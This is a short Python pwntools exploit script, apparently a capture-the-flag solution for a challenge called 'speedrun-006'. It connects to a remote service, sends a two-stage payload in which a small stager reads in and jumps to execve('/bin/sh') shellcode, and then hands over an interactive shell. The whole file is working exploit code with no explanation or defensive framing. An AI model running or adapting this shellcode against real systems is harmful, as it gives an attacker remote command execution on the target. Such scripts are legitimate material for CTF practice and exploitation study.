from pwn import *

# r = process("./speedrun-006")
# pause()
r = remote("172.17.0.9", 31337)
trap_killer = "\xb3"

stage = "\x0f\x05\xb2\x7f" + trap_killer + "\x48\x89\xce" + trap_killer + "\x48\x83\xee\x32\x0f\x05" + "\x90"*2 + trap_killer + "\xff\xe6\xc3" + "\x90"*5
shellcode = "\x48\x83\xc6\x11\x48\x89\xf7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"
# r.recv()
r.send(stage)
r.send(shellcode)
r.interactive()
